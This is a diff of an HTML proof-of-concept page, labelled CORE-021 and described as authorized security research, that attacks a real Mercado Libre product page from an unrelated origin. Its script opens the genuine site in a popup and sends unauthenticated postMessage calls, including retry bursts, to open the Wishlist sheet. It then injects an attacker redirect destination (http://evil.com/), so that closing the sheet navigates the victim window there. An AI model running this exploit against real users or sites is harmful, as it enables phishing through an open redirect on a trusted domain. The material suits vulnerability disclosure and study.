@@ -3,20 +3,19 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="color-scheme" content="dark">
-    <title>CORE-021 — Cross-Origin postMessage PoC</title>
+    <title>CORE-021 PoC</title>
     <style>
       :root {
-        --bg: #070a13;
-        --panel: rgba(17, 24, 39, .86);
-        --panel-2: rgba(10, 15, 28, .92);
-        --line: rgba(148, 163, 184, .2);
-        --text: #f8fafc;
-        --muted: #9ca3af;
-        --yellow: #ffe600;
-        --blue: #3483fa;
-        --green: #34d399;
-        --red: #fb7185;
+        color-scheme: dark;
+        --background: #0b0d10;
+        --panel: #12151a;
+        --field: #0d1014;
+        --border: #282d35;
+        --text: #e7e9ed;
+        --muted: #9299a5;
+        --accent: #8aa4ff;
+        --success: #79c995;
+        --error: #df8790;
       }
 
       * { box-sizing: border-box; }
@@ -24,207 +23,218 @@
       body {
         margin: 0;
         min-height: 100vh;
+        background: var(--background);
         color: var(--text);
-        background:
-          radial-gradient(circle at 15% 10%, rgba(52, 131, 250, .18), transparent 32rem),
-          radial-gradient(circle at 85% 90%, rgba(255, 230, 0, .09), transparent 28rem),
-          var(--bg);
-        font: 16px/1.55 Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        font: 15px/1.55 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
       }
 
-      .shell { width: min(980px, calc(100% - 32px)); margin: 0 auto; padding: 52px 0 72px; }
-
-      .eyebrow {
-        display: inline-flex;
-        gap: 9px;
-        align-items: center;
-        padding: 7px 11px;
-        border: 1px solid rgba(52, 211, 153, .3);
-        border-radius: 999px;
-        color: #a7f3d0;
-        background: rgba(6, 78, 59, .18);
-        font-size: 12px;
-        font-weight: 800;
-        letter-spacing: .08em;
-        text-transform: uppercase;
+      main {
+        width: min(760px, calc(100% - 32px));
+        margin: 0 auto;
+        padding: 48px 0 72px;
       }
 
-      .pulse { width: 8px; height: 8px; border-radius: 50%; background: var(--green); box-shadow: 0 0 18px var(--green); }
-      h1 { max-width: 800px; margin: 22px 0 12px; font-size: clamp(34px, 6vw, 64px); line-height: 1.02; letter-spacing: -.045em; }
-      .lead { max-width: 760px; margin: 0 0 34px; color: #cbd5e1; font-size: 18px; }
-      .highlight { color: var(--yellow); }
+      header { margin-bottom: 24px; }
+      h1 { margin: 0 0 7px; font-size: 26px; font-weight: 650; letter-spacing: -.02em; }
+      h2 { margin: 0 0 14px; font-size: 15px; font-weight: 650; }
+      p { margin: 0; color: var(--muted); }
+      code { color: #c6d1ff; font: 13px/1.5 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
 
-      .grid { display: grid; grid-template-columns: minmax(0, 1.35fr) minmax(280px, .65fr); gap: 18px; }
-      .card { border: 1px solid var(--line); border-radius: 20px; background: var(--panel); box-shadow: 0 20px 60px rgba(0, 0, 0, .28); backdrop-filter: blur(16px); }
-      .main-card { padding: 24px; }
-      .side-card { padding: 22px; background: var(--panel-2); }
+      .panel {
+        margin-top: 14px;
+        padding: 20px;
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        background: var(--panel);
+      }
 
-      label { display: block; margin: 0 0 7px; color: #e5e7eb; font-size: 13px; font-weight: 800; }
-      .field + .field { margin-top: 16px; }
+      .origin {
+        margin-top: 9px;
+        padding: 10px 12px;
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        background: var(--field);
+        overflow-wrap: anywhere;
+      }
+
+      .field + .field { margin-top: 15px; }
+      label { display: block; margin-bottom: 6px; color: #c9cdd4; font-size: 13px; font-weight: 600; }
       input {
         width: 100%;
-        min-height: 48px;
-        padding: 11px 13px;
-        border: 1px solid rgba(148, 163, 184, .26);
-        border-radius: 12px;
+        padding: 11px 12px;
+        border: 1px solid var(--border);
+        border-radius: 8px;
         outline: none;
+        background: var(--field);
         color: var(--text);
-        background: rgba(2, 6, 23, .72);
-        font: 14px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+        font: 13px/1.45 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
       }
-      input:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(52, 131, 250, .15); }
-      input[readonly] { color: #a7f3d0; }
+      input:focus { border-color: var(--accent); }
 
-      .steps { display: grid; gap: 11px; margin-top: 22px; }
+      .actions { display: grid; gap: 9px; margin-top: 20px; }
       button {
-        display: grid;
-        grid-template-columns: 34px 1fr auto;
-        gap: 12px;
-        align-items: center;
         width: 100%;
-        min-height: 60px;
-        padding: 10px 14px;
-        border: 1px solid rgba(148, 163, 184, .2);
-        border-radius: 14px;
+        padding: 12px 14px;
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        background: #191d24;
         color: var(--text);
-        background: rgba(30, 41, 59, .68);
         text-align: left;
         cursor: pointer;
-        transition: transform .15s ease, border-color .15s ease, background .15s ease;
+        font: inherit;
       }
-      button:hover:not(:disabled) { transform: translateY(-1px); border-color: rgba(52, 131, 250, .72); background: rgba(30, 58, 138, .34); }
-      button:disabled { cursor: not-allowed; opacity: .42; }
-      .number { display: grid; place-items: center; width: 32px; height: 32px; border-radius: 10px; color: #111827; background: var(--yellow); font-weight: 900; }
-      .button-title { display: block; font-weight: 850; }
-      .button-note { display: block; margin-top: 2px; color: var(--muted); font-size: 12px; }
-      .arrow { color: #64748b; font-size: 20px; }
+      button:hover:not(:disabled) { border-color: #46516a; background: #1d222b; }
+      button:disabled { opacity: .42; cursor: not-allowed; }
+      button strong { display: block; font-weight: 600; }
+      button span { display: block; margin-top: 2px; color: var(--muted); font-size: 12px; }
 
       .status {
-        margin-top: 18px;
-        padding: 14px 15px;
-        border: 1px solid rgba(52, 131, 250, .24);
-        border-radius: 13px;
-        color: #bfdbfe;
-        background: rgba(30, 64, 175, .14);
+        margin-top: 15px;
+        padding: 11px 12px;
+        border-left: 3px solid var(--accent);
+        border-radius: 4px;
+        background: #10141c;
+        color: #cdd5ef;
       }
-      .status strong { color: white; }
+      .status.success { border-color: var(--success); color: #c7ecd3; }
+      .status.error { border-color: var(--error); color: #f0c2c6; }
 
-      h2 { margin: 0 0 13px; font-size: 16px; }
-      .origin { overflow-wrap: anywhere; color: #93c5fd; font: 13px/1.5 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
-      .checklist { margin: 20px 0 0; padding: 0; list-style: none; }
-      .checklist li { position: relative; margin: 12px 0; padding-left: 25px; color: #cbd5e1; font-size: 14px; }
-      .checklist li::before { content: "✓"; position: absolute; left: 0; color: var(--green); font-weight: 900; }
-      .warning { margin-top: 20px; padding: 13px; border: 1px solid rgba(251, 113, 133, .28); border-radius: 12px; color: #fecdd3; background: rgba(159, 18, 57, .12); font-size: 13px; }
+      ol { margin: 0; padding-left: 21px; color: #c9cdd4; }
+      li + li { margin-top: 8px; }
+      .note { margin-top: 14px; font-size: 13px; }
 
-      .log-card { margin-top: 18px; padding: 18px; }
-      pre { min-height: 120px; margin: 0; overflow: auto; white-space: pre-wrap; color: #d1fae5; font: 13px/1.55 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
-      .footer { margin-top: 20px; color: #64748b; font-size: 12px; text-align: center; }
-
-      @media (max-width: 780px) {
-        .shell { padding-top: 30px; }
-        .grid { grid-template-columns: 1fr; }
-        .main-card, .side-card { padding: 18px; }
+      pre {
+        min-height: 130px;
+        margin: 0;
+        overflow: auto;
+        white-space: pre-wrap;
+        color: #bbc4d2;
+        font: 12px/1.6 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
       }
+
+      footer { margin-top: 18px; color: #626a76; font-size: 12px; text-align: center; }
     </style>
   </head>
   <body>
-    <main class="shell">
-      <span class="eyebrow"><span class="pulse"></span> Authorized security research PoC</span>
-      <h1>Cross-origin <span class="highlight">postMessage</span> redirect</h1>
-      <p class="lead">This page demonstrates that an unrelated origin can open a genuine mobile Mercado Libre product page, activate its Wishlist UI, inject an external destination, and cause navigation when the sheet is closed.</p>
+    <main>
+      <header>
+        <h1>CORE-021 — cross-origin postMessage PoC</h1>
+        <p>Wishlist redirect validation from an unrelated web origin.</p>
+        <div class="origin"><code id="origin"></code></div>
+      </header>
 
-      <section class="grid">
-        <div class="card main-card">
-          <div class="field">
-            <label for="target">Victim product page</label>
-            <input id="target" value="https://www.mercadolibre.com.ar/el-portugues-nueces-mariposas-extra-light-x-1kg/p/MLA25811881/">
-          </div>
-
-          <div class="field">
-            <label for="destination">Attacker-controlled redirect destination</label>
-            <input id="destination" value="http://evil.com/">
-          </div>
-
-          <div class="steps">
-            <button id="open">
-              <span class="number">1</span>
-              <span><span class="button-title">Open Mercado Libre</span><span class="button-note">Opens the genuine mobile product page in a new window</span></span>
-              <span class="arrow">→</span>
-            </button>
-
-            <button id="wishlist" disabled>
-              <span class="number">2</span>
-              <span><span class="button-title">Open Wishlist through postMessage</span><span class="button-note">Sends the unauthenticated OPEN_LISTS_MODAL message</span></span>
-              <span class="arrow">→</span>
-            </button>
-
-            <button id="inject" disabled>
-              <span class="number">3</span>
-              <span><span class="button-title">Arm the external redirect</span><span class="button-note">Injects evil.com as the Wishlist close destination</span></span>
-              <span class="arrow">→</span>
-            </button>
-
-            <button id="focus" disabled>
-              <span class="number">4</span>
-              <span><span class="button-title">Return to the victim window</span><span class="button-note">Close Wishlist with its normal X button to trigger navigation</span></span>
-              <span class="arrow">→</span>
-            </button>
-          </div>
-
-          <div class="status" id="status"><strong>Ready.</strong> Start with step 1 and wait for the product page to finish loading.</div>
+      <section class="panel">
+        <div class="field">
+          <label for="target">Mercado Libre product page</label>
+          <input id="target" value="https://www.mercadolibre.com.ar/el-portugues-nueces-mariposas-extra-light-x-1kg/p/MLA25811881/">
         </div>
 
-        <aside class="card side-card">
-          <h2>Attacker origin</h2>
-          <div class="origin" id="origin"></div>
+        <div class="field">
+          <label for="destination">External destination</label>
+          <input id="destination" value="http://evil.com/">
+        </div>
 
-          <ul class="checklist">
-            <li>Use a mobile User-Agent before loading either page.</li>
-            <li>Allow popups for this GitHub Pages origin.</li>
-            <li>Use only your own Mercado Libre test session.</li>
-            <li>Do not select a list or change any favorite.</li>
-            <li>After step 3, close the Wishlist sheet normally.</li>
-          </ul>
+        <div class="actions">
+          <button id="open">
+            <strong>1. Open Mercado Libre</strong>
+            <span>Wait until the mobile product page has fully loaded.</span>
+          </button>
 
-          <div class="warning">Run the messages from this attacker page. Pasting them into Mercado Libre DevTools would not demonstrate the cross-origin issue.</div>
-        </aside>
+          <button id="wishlist" disabled>
+            <strong>2. Open Wishlist</strong>
+            <span>Sends OPEN_LISTS_MODAL several times during a short retry window.</span>
+          </button>
+
+          <button id="inject" disabled>
+            <strong>3. Set external redirect</strong>
+            <span>Injects the destination through the second message handler.</span>
+          </button>
+
+          <button id="focus" disabled>
+            <strong>4. Focus victim window</strong>
+            <span>Close Wishlist with the normal X button to trigger the redirect.</span>
+          </button>
+        </div>
+
+        <div class="status" id="status">Ready. Start with step 1.</div>
       </section>
 
-      <section class="card log-card">
-        <h2>PoC event log</h2>
-        <pre id="log">No messages sent yet.</pre>
+      <section class="panel">
+        <h2>Recording sequence</h2>
+        <ol>
+          <li>Use a mobile User-Agent and your own logged-in test session.</li>
+          <li>Open the product and wait for it to finish loading.</li>
+          <li>Send step 2 and confirm that Wishlist appears.</li>
+          <li>Return here and send step 3.</li>
+          <li>Close Wishlist with its X button.</li>
+          <li>The same window should navigate to <code>http://evil.com/</code>.</li>
+        </ol>
+        <p class="note">Do not select a list or modify a favorite. Keep this attacker tab open throughout the test.</p>
       </section>
 
-      <p class="footer">CORE-021 · CWE-346 / CWE-601 · Non-destructive proof of concept</p>
+      <section class="panel">
+        <h2>Event log</h2>
+        <pre id="log">No messages sent.</pre>
+      </section>
+
+      <footer>Authorized, non-destructive security test · CWE-346 / CWE-601</footer>
     </main>
 
     <script>
       let victim = null;
+      let wishlistTimer = null;
+      let redirectTimer = null;
+
       const status = document.querySelector('#status');
       const log = document.querySelector('#log');
       const wishlistButton = document.querySelector('#wishlist');
       const injectButton = document.querySelector('#inject');
       const focusButton = document.querySelector('#focus');
 
-      document.querySelector('#origin').textContent = location.origin;
+      document.querySelector('#origin').textContent = 'Attacker origin: ' + location.origin;
+
+      function setStatus(message, type = '') {
+        status.textContent = message;
+        status.className = 'status' + (type ? ' ' + type : '');
+      }
+
+      function appendLog(lines) {
+        log.textContent += '\n' + lines.join('\n');
+      }
 
       function victimAvailable() {
         return victim && !victim.closed;
       }
 
-      function setStatus(title, detail) {
-        status.innerHTML = '';
-        const strong = document.createElement('strong');
-        strong.textContent = title;
-        status.append(strong, document.createTextNode(' ' + detail));
+      function postBurst(message, attempts, interval, timerName) {
+        if (timerName === 'wishlist' && wishlistTimer) window.clearInterval(wishlistTimer);
+        if (timerName === 'redirect' && redirectTimer) window.clearInterval(redirectTimer);
+
+        let sent = 1;
+        victim.postMessage(message, '*');
+
+        const timer = window.setInterval(() => {
+          if (!victimAvailable() || sent >= attempts) {
+            window.clearInterval(timer);
+            return;
+          }
+          victim.postMessage(message, '*');
+          sent += 1;
+        }, interval);
+
+        if (timerName === 'wishlist') wishlistTimer = timer;
+        if (timerName === 'redirect') redirectTimer = timer;
       }
 
       document.querySelector('#open').addEventListener('click', () => {
+        if (wishlistTimer) window.clearInterval(wishlistTimer);
+        if (redirectTimer) window.clearInterval(redirectTimer);
+
         const target = document.querySelector('#target').value.trim();
         victim = window.open(target, 'core021-victim');
 
         if (!victim) {
-          setStatus('Popup blocked.', 'Allow popups for this site and repeat step 1.');
+          setStatus('Popup blocked. Allow popups for this site and repeat step 1.', 'error');
           return;
         }
 
@@ -232,39 +242,44 @@
         injectButton.disabled = true;
         focusButton.disabled = false;
         log.textContent = [
-          '[1] Victim window opened by attacker origin',
-          'attacker origin: ' + location.origin,
-          'victim URL: ' + target,
+          '[1] Victim window opened',
+          'sender: ' + location.origin,
+          'target: ' + target,
           'WindowProxy retained: true'
         ].join('\n');
-        setStatus('Victim opened.', 'Wait for the product page to load completely, then return here for step 2.');
+        setStatus('Victim opened. Wait for the product page to fully load, then return for step 2.', 'success');
       });
 
       wishlistButton.addEventListener('click', () => {
         if (!victimAvailable()) {
-          setStatus('Victim unavailable.', 'Repeat step 1 to obtain a new window reference.');
+          setStatus('Victim window is unavailable. Repeat step 1.', 'error');
           return;
         }
 
-        victim.postMessage('OPEN_LISTS_MODAL', '*');
+        postBurst('OPEN_LISTS_MODAL', 8, 500, 'wishlist');
         injectButton.disabled = false;
-        victim.focus();
-        log.textContent += [
+        appendLog([
           '',
-          '[2] Cross-origin message sent',
-          "victim.postMessage('OPEN_LISTS_MODAL', '*');"
-        ].join('\n');
-        setStatus('Wishlist message sent.', 'Confirm that the genuine Wishlist sheet appeared, then return here for step 3.');
+          '[2] OPEN_LISTS_MODAL sent',
+          "victim.postMessage('OPEN_LISTS_MODAL', '*');",
+          'retry window: 8 messages / 4 seconds'
+        ]);
+        setStatus('Wishlist message sent with limited retries. Check the victim window and wait up to 5 seconds.', 'success');
+        victim.focus();
       });
 
       injectButton.addEventListener('click', () => {
-        const redirectUrl = document.querySelector('#destination').value.trim();
-
         if (!victimAvailable()) {
-          setStatus('Victim unavailable.', 'Repeat step 1 to obtain a new window reference.');
+          setStatus('Victim window is unavailable. Repeat step 1.', 'error');
           return;
         }
 
+        if (wishlistTimer) {
+          window.clearInterval(wishlistTimer);
+          wishlistTimer = null;
+        }
+
+        const redirectUrl = document.querySelector('#destination').value.trim();
         const message = {
           method: 'giftRegistry:celebration-date:set-current-step',
           args: {
@@ -273,16 +288,17 @@
           }
         };
 
-        victim.postMessage(message, '*');
-        victim.focus();
-        log.textContent += [
+        postBurst(message, 5, 350, 'redirect');
+        appendLog([
           '',
-          '[3] External redirect destination injected',
+          '[3] Redirect message sent',
           JSON.stringify(message, null, 2),
+          'retry window: 5 messages / 1.75 seconds',
           '',
-          '[4] Close the Wishlist sheet in the victim window.'
-        ].join('\n');
-        setStatus('Redirect armed.', 'Close Wishlist with its normal X button. The genuine window should navigate to ' + redirectUrl);
+          '[4] Close Wishlist with its X button.'
+        ]);
+        setStatus('Redirect armed. Wait 2 seconds, then close Wishlist with the normal X button.', 'success');
+        victim.focus();
       });
 
       focusButton.addEventListener('click', () => {
